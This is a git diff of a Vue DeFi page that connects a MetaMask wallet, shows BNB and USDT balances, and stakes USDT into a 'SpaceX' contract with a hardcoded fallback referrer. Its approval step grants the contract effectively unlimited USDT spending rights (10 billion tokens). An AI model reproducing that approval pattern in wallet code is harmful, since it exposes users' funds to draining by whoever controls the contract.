@@ -1,16 +1,217 @@
 
 <script setup>
+  import { ref, computed, onMounted } from "vue";
+  import { RouterLink, RouterView } from "vue-router";
+  import { useStorage } from '@vueuse/core'
+  import { useRouteQuery } from '@vueuse/router'
 	import IconUSDT from '@/components/icons/IconUSDT.vue'
 	import IconSpacex from '@/components/icons/IconSpacex.vue'
+  import { useGlobalState } from "@/store";
+  import { useDebounceFn } from '@vueuse/core'
+  import { ElMessage } from "element-plus";
+  import { Pointer } from '@element-plus/icons-vue'
+  import SpaceXABI from "@/abis/defiABI.json";
+  import usdtABI from "@/abis/usdtABI.json";
+  const tabsActive = ref(0)
+  const myUSDTNumber = ref(0)
+  const addSpaceX = ref(0)
+  const state = useGlobalState();
+  let web3 = ref();
+  let myAddress = ref(""); //我的地址
+  let infoData = ref(""); //我的地址
+  let myETHBalance = ref(""); // EHT余额
+  let myUSDTBalance = ref(""); // USDT余额
+  let mySpaceXBalance = ref(""); // SpaceX余额
+  let DeFiContract = ref(""); // 合约实例
+  let usdtContract = ref(""); // usdt合约实例
+  const invites = useRouteQuery('invites')
+  const refLinks = ref('')
+  if(invites.value){
+    refLinks.value = localStorage.getItem('invites')
+  }else{
+    refLinks.value =  '0xDA02d522d8cd60de0a2F9773f80b16Fc9ED99bdd'
+  }
+  const changeTabs = (idx)=>{
+    tabsActive.value = idx
+  }
+  onMounted(() => {
+
+    // Web3浏览器检测
+    if (typeof window.ethereum !== "undefined") {
+      console.log("MetaMask is installed!");
+      console.log("当前连接网络的id:", window.ethereum.chainId);
+    }
+
+    web3.value = new Web3(window.ethereum);
+    // 连接钱包账户切换后触发的事件
+    ethereum.on("accountsChanged", function (accounts) {
+      console.log("连接钱包账户切换后触发的事件", accounts[0]); //一旦切换账号这里就会执行
+      myAddress.value = accounts[0];
+      joinWeb3();
+    });
+    // 正确处理链更改之后的业务流程可能很复杂。官方建议链更改只有重新加载页面
+    ethereum.on("chainChanged", (chainId) => {
+      console.log("chainId", chainId);
+      window.location.reload();
+    });
+    // 断开连接监听事件
+    ethereum.on("disconnect", async function (result, error) {
+      console.log("断开连接", result);
+      console.log("error", error);
+    });
+    connections();
+  });
+
+  const connections = () => {
+    //链接小狐狸钱包
+    window.ethereum
+      .request({ method: "eth_requestAccounts" })
+      .then((res) => {
+        console.log(res, "当前钱包地址");
+        myAddress.value = res[0];
+        joinWeb3();
+      })
+      .catch((err) => {
+        console.log(err);
+        if (err.code == 4001) {
+          console.log("用户拒绝连接");
+        }
+      });
+  };
+  const joinWeb3 = async () => {
+    let eth_chainId = web3.value.eth.getChainId();
+    console.log("eth_chainId", eth_chainId);
+    let accounts = await web3.value.eth.getAccounts();
+    console.log("查询eth_chainId", eth_chainId);
+    // 请求用户授权 解决web3js无法直接唤起Meta Mask获取用户身份
+    const enable = await ethereum.enable();
+    console.log("enable", enable[0]);
+    // // 授权获取账户
+    // 返回指定地址账户的余额
+    let balance = await web3.value.eth.getBalance(enable[0]);
+    myAddress.value = accounts[0];
+    console.log("balance", balance);
+    try {
+      // 创建合约实例
+      DeFiContract.value = new web3.value.eth.Contract(SpaceXABI,state.contractAddress.value);
+      console.log('DeFiContract.value ',DeFiContract.value );
+      // 获取合约中返回的信息
+      infoData.value = await DeFiContract.value.methods.getInfo(myAddress.value).call();
+      // 设置info值
+      state.updateInfoData(infoData.value);
+      console.log('infoData.value',infoData.value);
+      // 创建usdt合约实例
+      usdtContract.value = new web3.value.eth.Contract(usdtABI, state.infoData.value.usdtCoin);
+      console.log('usdtContract.value',usdtContract.value);
+      // 获取钱包eth余额
+      myETHBalance.value = web3.value.utils.fromWei(balance, "ether");
+      console.log('myETHBalance',myETHBalance.value);
+      // 获取usdt余额
+      let usdtBalance = await usdtContract.value.methods.balanceOf(myAddress.value).call();
+      myUSDTBalance.value = web3.value.utils.fromWei(usdtBalance, "ether");
+      console.log('usdtBalance',myUSDTBalance.value);
+      // 获取当前质押等级
+      state.userLevel.value = await DeFiContract.value.methods.getUserLevel(myAddress.value).call();
+      console.log("state.userLevel.value", state.userLevel.value);
+    } catch (e) {
+      console.log(e);
+    }
+  };
+  const addLiquidityFn = useDebounceFn( async(val) => {
+    if(!myAddress.value || myAddress.value === '0x00000000000000000000000000000000deadbeef'){
+      return joinWeb3()
+    }
+    if(myETHBalance.value * 1 < 0.001) return ElMessage.warning('Insufficient Gas');
+    if(myUSDTBalance.value < 0.01 || myUSDTNumber.value < 0.01) return ElMessage.error('Minimum deposit amount 0.01 BNB');
+    const callValue = web3.value.utils.toWei(myUSDTNumber.value);
+    // 判断是否授权
+    let allowanceOfCurrentAccount = await usdtContract.value.methods.allowance(myAddress.value, state.contractAddress.value).call();
+    console.log('被授权的数量：',allowanceOfCurrentAccount);
+    if(allowanceOfCurrentAccount == 0 || allowanceOfCurrentAccount < callValue){
+      console.log('执行授权语句');
+      let defaultVal = web3.value.utils.toWei("10000000000", "ether");
+      usdtContract.value.methods.approve(state.contractAddress.value , defaultVal).send({from: myAddress.value,gas:20000000}).then((receipt) => {
+        console.log('Approval successful:', receipt);
+        ElMessage.success('授权成功！请继续操作！',3)
+      }).catch((error) => {
+        console.error('Approval failed:', error.code);
+        if(error.code == '-32603'){
+          ElMessage.error('GAS is low, please adjust the cost of GAS');
+        }
+      });
+
+    }else{
+      //执行转账语句
+      console.log('执行转账语句');
+      if(DeFiContract.value){
+        try{
+          const mode = 1; // 模式
+            let inviter = ref('');
+            if(web3.value.utils.isAddress(refLinks.value)){
+              inviter.value = refLinks.value;
+            }
+            DeFiContract.value.methods.stake(
+              inviter.value,
+              myAddress.value,
+              mode,
+              2000000
+            )
+            .send({
+              from: myAddress.value,
+            })
+            .on('transactionHash', (hash)=>{
+              console.log(hash);
+              ElMessage.success('Transaction sent')
+              console.log("Transaction sent");
+            })
+            .once('receipt', res => {
+              ElMessage.success('Transaction confirmed')
+              console.log("Transaction confirmed");
+              joinWeb3();
+            })
+            .catch(err => console.log(err))
+          }catch(e){
+            console.log(e);
+          }
+      }
+    }
+
+
+  }, 500)
+
+
 </script>
 <template>
     <div class="home">
       <Header />
-
       <section class="section-animate bg-dragon liquidity_warp">
         <div class="section-inner-center">
             <div class="lp_warp">
-                <h2>liquidity list</h2>
+              <div class="content-tabs animate" role="tablist" style="opacity: 1; visibility: inherit; translate: none; rotate: none; scale: none; transform: translate3d(0px, 0px, 0px);">
+              </div>
+                <h2>{{ $t("AddLiquidity") }}</h2>
+                <div class="tab_tlt_warp">
+                  <div class="tab_tlt_item" :class="{active : tabsActive == 0}" @click="changeTabs(0)">
+                    USDT
+                  </div>
+                  <span>|</span> 
+                  <div class="tab_tlt_item" :class="{active : tabsActive == 1}" @click="changeTabs(1)">
+                    USDT + SpaceX
+                  </div>
+                </div>
+                <div class="my_balance_box">
+                  <div>
+                    {{ $t("WalletBalance") }}：
+                  </div>
+                  <div>
+                    <div style="text-align: right;">
+                      {{ myETHBalance }} BNB 
+                    </div>
+                    <div style="text-align: right;">
+                      {{ myUSDTBalance }} USDT
+                    </div>
+                  </div>
+                </div>
                 <table class="data additional-toggle" style="display: table">
                     <tbody >
                         <tr class="js-stagger">
@@ -20,80 +221,57 @@
                               </div>
                             </td>
                             <td >
-                                70
+                                <input type="text" v-model="myUSDTNumber">
                             </td>
                         </tr>
-                        <tr class="js-stagger">
+                        <tr class="js-stagger" v-if="tabsActive !=0">
                             <td >
                               <div class="coin_box">
                                 <IconSpacex class="lp_icon" /> SpaceX
                               </div>
                             </td>
                             <td >
-                                70000
+                              <input type="text" v-model="addSpaceX">
                             </td>
                         </tr>
                     </tbody>
                 </table>
-                
             </div>
-            <div class="add_liquidity">
-			        <span class="text">添加流动性</span>
+            <div class="add_liquidity" @click="addLiquidityFn()">
+			        <span class="text">{{ $t("AddLiquidity") }}</span>
 		        </div>
         </div>
-          <!-- <div class="my_liquidity" style="--color: #0f2bff">
-            <div class="my_liquidity_tlt">
-              <h4>Liquidity List</h4>
-            </div>
-            <div class="my_liquidity_list">
-              <div class="my_liquidity_top">
-                <span class="my_liquidity_item_num">number</span>
-                <span class="my_liquidity_item_usdt">USDT</span>
-                <span class="my_liquidity_item_sx">SpaceX</span>
-              </div>
-              <div class="my_liquidity_item">
-                <span class="my_liquidity_item_num">1</span>
-                <span class="my_liquidity_item_usdt">999</span>
-                <span class="my_liquidity_item_sx">1999</span>
-              </div>
-              <div class="my_liquidity_item">
-                <span class="my_liquidity_item_num">2</span>
-                <span class="my_liquidity_item_usdt">1999</span>
-                <span class="my_liquidity_item_sx">2999</span>
-              </div>
-            </div>
-            <div class="add_lp_warp">
-              <div class="add_lp_list">
-                <div class="add_lp_list_top">
-                  <IconUSDT class="lp_icon" /> USDT
-                </div>
-                <div class="add_lp_list_bottom">
-                  <input type="text" name="" id="">
-                  <div class="moey">~265.27 USD</div>
-                </div>
-              </div>
-              <div class="add_lp_list">
-                <div class="add_lp_list_top">
-                  <IconSpacex class="lp_icon" /> USDT
-                </div>
-                <div class="add_lp_list_bottom">
-                  <input type="text" name="" id="">
-                  <div class="moey">~265.27 USD</div>
-                </div>
-              </div>
-            </div>
-            <div class="add_liquidity">
-			        <span class="text">添加流动性</span>
-		        </div>
-          </div> -->
       </section>
-
-  
       <Footer />
     </div>
   </template>
   
   <style lang="less" scoped>
+  .my_balance_box{
+    display: flex;
+    justify-content: space-between;
+    padding: 20px 0;
+    font-family: D-DIN-Bold;
+    border-bottom: 1px solid #fff;
+  }
+  .tab_tlt_warp{
+    display: flex;
+    align-items: center;
+    font-family: D-DIN-Bold;
+    margin-top: 20px;
+    span{
+      display: block;
+      margin: 0 6px;
+      opacity: .5;
+    }
+    .tab_tlt_item{
+      opacity: .5;
+      transition: opacity .3s;
+      &.active{
+        opacity: 1;
+      }
+    }
+  }
   .liquidity_warp{
     display: flex;
     align-items: center;
@@ -101,6 +279,8 @@
   }
   .lp_warp{
     h2{
+      font-size: 30px;
+      font-family: D-DIN-Bold;
       text-align: left;
     }
   }
@@ -232,8 +412,22 @@ table td {
     font: 600 16px/18px D-DIN-Regular,Arial,Verdana,sans-serif;
     text-align: left;
     color: #fff;
-    padding: 20px 0;
+    // padding: 20px 0;
     border-bottom: 1pt solid rgba(255,255,255,.3);
+}
+table td input{
+  height: 60px;
+  background-color: #fff0;
+  border: none;
+  text-align: right;
+  color: #fff;
+  font-family: D-DIN-Bold;
+  font-size: 16px;
+  outline: none;
+  &:focus{
+    border: none;
+    outline: none;
+  }
 }
 table.data td {
     text-align: right;
